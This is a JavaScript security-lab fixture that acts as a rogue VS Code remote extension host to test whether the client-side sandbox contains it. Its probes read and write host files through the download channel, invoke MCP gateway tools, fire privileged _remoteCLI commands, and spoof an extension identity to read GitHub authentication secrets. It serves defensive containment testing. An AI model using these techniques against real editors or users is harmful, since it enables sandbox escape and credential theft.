// Rogue REH probes: the server side of the boundary, attacking the client.
//
// Under our threat model the REH server process runs inside the tab, so it is
// hostile. It reaches surfaces the extension host cannot:
//
//   * channels the CLIENT registers on the remote connection and the server
//     calls directly (download, mcpGatewayToolBroker). These never pass through
//     RPCProtocol, so a MainThread*-only filter does not see them at all.
//   * raw MainThread* RPC with arguments no public API would produce, notably a
//     spoofed extension identity.
//
// Loaded by the test-only hook in patches/0005-test-only-rogue-reh-hook.patch,
// which runs only when SECLAB_ROGUE_REH=1. It is a fixture, never shipped
// behaviour, and it only ever runs against our own local builds.
//
// Evidence goes to $SECLAB_ROGUE_REH_OUT/reh-probes.json, in the same shape as
// the extension-side probes so check-probes.ts can apply the same rules.

'use strict';

const fs = require('fs');
const path = require('path');
const safety = require('./probe-safety.js');

const SUCCEEDED = 'succeeded';
const DENIED = 'denied';
const ERROR = 'error';

function classify(err) {
	const msg = String((err && err.message) || err);
	// A safety refusal is a harness fault, never containment.
	if (err && err.seclabSafety) {
		return { outcome: ERROR, detail: msg };
	}
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation|channel not found/i.test(msg)) {
		return { outcome: DENIED, detail: msg };
	}
	return { outcome: ERROR, detail: msg };
}

async function probe(results, id, policyRef, fn) {
	try {
		const detail = await fn();
		results.push({
			id, policyRef, outcome: SUCCEEDED,
			detail: typeof detail === 'string' ? detail : JSON.stringify(detail ?? null),
		});
	} catch (err) {
		const { outcome, detail } = classify(err);
		results.push({ id, policyRef, outcome, detail });
	}
}


/** The server's own handle on the terminal channel it registered. */
function terminalChannel(socketServer) {
	// ChannelServer keeps its registrations in a private `channels` map, which
	// is an ordinary property at runtime. Reaching it is exactly the liberty a
	// compromised REH has: it is the same process.
	const channels = socketServer && socketServer.channels;
	const get = channels && (channels.get ? (n) => channels.get(n) : (n) => channels[n]);
	return get ? (get('remoteterminal') || get('remoteTerminal')) : undefined;
}

/** Persistent process ids this REH has created, which the window owns. */
function persistentProcessIds(channel) {
	const svc = channel && (channel._ptyService || channel.ptyService);
	const ptys = svc && (svc._ptys || svc.ptys);
	if (ptys && typeof ptys.keys === 'function') {
		return Array.from(ptys.keys());
	}
	return [];
}

/**
 * Fire onExecuteCommand for each _remoteCLI command on the client's allow list.
 *
 * Each command gets its OWN marker and its own probe id. They were previously
 * asserted only through the shared "no host file outside the workspace" check,
 * which fails for every vector at once: with one marker, any one escape masks
 * the state of the others, and a fix to one looks like a fix to all.
 */
async function runExecuteCommandProbes(results, ctx, socketServer) {
	const channel = terminalChannel(socketServer);
	const emitter = channel && (channel._onExecuteCommand || channel.onExecuteCommandEmitter);

	// Each entry: probe id, command, marker suffix, and how to build its args.
	const vectors = [
		{
			id: 'reh-onexecutecommand-windowopen',
			commandId: '_remoteCLI.windowOpen',
			suffix: '-windowopen',
			// Opening a window on a host path is host-side UI acting on our input,
			// and the opened folder is then trusted by the window that opens it.
			args: (ctx) => [[], { forceNewWindow: true, folderURIs: [] }],
		},
		{
			id: 'reh-onexecutecommand-manageextensions',
			commandId: '_remoteCLI.manageExtensions',
			suffix: '-manageextensions',
			// Installing an extension on the trusted side is host code execution.
			// We ask only for a LIST, never an install: the escape is reaching the
			// command at all, and the payload must not also be an attack.
			args: () => [{ list: { showVersions: false } }],
		},
		{
			id: 'reh-onexecutecommand-openexternal',
			commandId: '_remoteCLI.openExternal',
			suffix: '-openexternal',
			// Egress from the trusted side, around the tab's broker. The target is
			// the harness beacon, so reaching it is observed host-side.
			args: (ctx) => [[safety.safeUrl(ctx, 'openExternal target')]],
		},
	];

	if (!emitter || typeof emitter.fire !== 'function') {
		// Not a pass. An absent fixture must never read as containment, so this
		// is ERROR, which check-probes.ts refuses to count as a denial.
		for (const v of vectors) {
			results.push({
				id: v.id, policyRef: 'push:remoteterminal:$onExecuteCommand',
				outcome: ERROR,
				detail: 'no onExecuteCommand emitter on the registered terminal channel',
			});
		}
		return;
	}

	const ids = persistentProcessIds(channel);
	if (ids.length === 0) {
		for (const v of vectors) {
			results.push({
				id: v.id, policyRef: 'push:remoteterminal:$onExecuteCommand',
				outcome: ERROR,
				detail: 'no persistent pty in this window yet; the client drops the '
					+ 'event when it owns no matching pty, so this is inconclusive',
			});
		}
		return;
	}

	const persistentProcessId = ids[0];
	let reqId = 0x5EC1AB00;
	for (const v of vectors) {
		await probe(results, v.id, 'push:remoteterminal:$onExecuteCommand', async () => {
			const marker = safety.runPath(ctx, `PWNED${v.suffix}`, 'execute-command marker');
			safety.note(ctx, marker);
			const reply = new Promise((resolve) => {
				// The client answers through sendCommandResult, so a reply is proof
				// the trusted side ran -- or refused -- rather than ignored us.
				const done = (payload) => resolve(payload);
				const pending = channel._pendingCommands;
				if (pending && typeof pending.set === 'function') {
					pending.set(reqId, { resolve: done, reject: done });
				}
				setTimeout(() => resolve('no reply within 5s'), 5000);
			});
			emitter.fire({
				reqId: reqId++,
				persistentProcessId,
				commandId: v.commandId,
				commandArgs: v.args(ctx),
			});
			const payload = await reply;
			return { command: v.commandId, marker, reply: String(payload).slice(0, 200) };
		});
	}
}

/**
 * @param socketServer the server's SocketServer; getChannel(name, router)
 *   returns a proxy to a channel the CLIENT registered.
 * @param router a StaticRouter selecting the renderer connection.
 */
async function runRehProbes(socketServer, router) {
	const results = [];
	const ctx = safety.context();
	if (!ctx.armed) {
		return [{ id: 'harness', policyRef: '', outcome: ERROR, detail: `not armed: ${ctx.reason}` }];
	}

	// --- download channel ----------------------------------------------------
	// DownloadServiceChannel revives BOTH URIs from arguments the server sends,
	// so the trusted side fetches a source we name and writes to a destination
	// we name. Reading a host path we could not otherwise see proves host FS
	// read; writing a marker proves host FS write.
	const download = () => socketServer.getChannel('download', router);
	await probe(results, 'channel-download-host-read', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download-read`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return fs.existsSync(dest) ? fs.readFileSync(dest, 'utf8') : 'call returned without error';
	});
	await probe(results, 'channel-download-host-write', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return dest;
	});

	// --- MCP gateway tool broker --------------------------------------------
	// callToolForServer invokes a tool hosted on the TRUSTED side, which is a
	// host process holding host credentials, with arguments we choose.
	const mcp = () => socketServer.getChannel('mcpGatewayToolBroker', router);
	await probe(results, 'channel-mcp-list-servers', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('listServers', [{}]));
	await probe(results, 'channel-mcp-call-tool', 'chan:mcpGatewayToolBroker',
		async () => await mcp().call('callToolForServer', [{
			serverId: process.env.SECLAB_PROBE_MCP_SERVER || 'host-probe',
			toolName: process.env.SECLAB_PROBE_MCP_TOOL || 'run',
			// Marker only. A tool invocation is the escape being demonstrated;
			// the payload must not also be an attack.
			arguments: { command: safety.markerCommand(ctx, '.mcp') },
		}]));

	// --- raw RPC: spoofed extension identity ---------------------------------
	// $getKeys/$getPassword take the extension id as an ARGUMENT, so a hostile
	// host can name a UI-side extension and enumerate, then read, its secrets.
	// No public API can express this, which is why it lives here.
	if (typeof globalThis.__seclabMainThreadRpc === 'function') {
		const rpc = globalThis.__seclabMainThreadRpc;
		await probe(results, 'rpc-secret-identity-spoof', 'rpc:MainThreadSecretState.$getKeys',
			async () => {
				const victim = 'vscode.github-authentication';
				const keys = await rpc('MainThreadSecretState', '$getKeys', [victim]);
				const values = {};
				for (const k of (keys || []).slice(0, 8)) {
					values[k] = await rpc('MainThreadSecretState', '$getPassword', [victim, k]);
				}
				return { victim, keys, values };
			});
		await probe(results, 'rpc-proxy-auth', 'rpc:MainThreadWorkspace.$lookupAuthorization',
			() => rpc('MainThreadWorkspace', '$lookupAuthorization',
				[{ scheme: 'https', host: 'example.invalid', port: 443 }]));
	} else {
		// Not a pass. An absent hook must never look like containment.
		for (const id of ['rpc-secret-identity-spoof', 'rpc-proxy-auth']) {
			results.push({
				id, policyRef: 'rpc:raw', outcome: ERROR,
				detail: 'no raw RPC hook; rebuild with the test-only rogue-REH patch',
			});
		}
	}

	// --- server-initiated terminal callback ----------------------------------
	// onExecuteCommand is the push direction: the SERVER names a command and the
	// trusted workbench runs it. It reaches none of the other enforcement points
	// -- it never crosses RPCProtocol, it arrives on a ChannelClient rather than
	// a ChannelServer, and it carries no origin, so the command taint sees
	// nothing in flight.
	//
	// The client guards on `this._ptys.get(e.persistentProcessId)`, so the event
	// is only honoured for a terminal this window owns. That is why this was a
	// stub for so long. We satisfy it the way a real attacker would: the REH is
	// the thing that creates ptys, so it already knows their ids.
	await runExecuteCommandProbes(results, ctx, socketServer);

	return results;
}

async function main(socketServer, router) {
	const out = process.env.SECLAB_ROGUE_REH_OUT;
	if (!out) {
		return;
	}
	let results;
	try {
		// Targets come from the safety context, which derives them from the
		// harness-supplied run directory. Nothing here is read from the
		// environment the tab controls.
		results = await runRehProbes(socketServer, router);
	} catch (err) {
		results = [{ id: 'harness', policyRef: '', outcome: ERROR, detail: String(err && err.stack) }];
	}
	try {
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-probes.json'),
			JSON.stringify({ tab: process.env.SECLAB_TAB_ID || null, results }, null, 2));
	} catch { /* evidence is best effort */ }
}

module.exports = { runRehProbes, main };
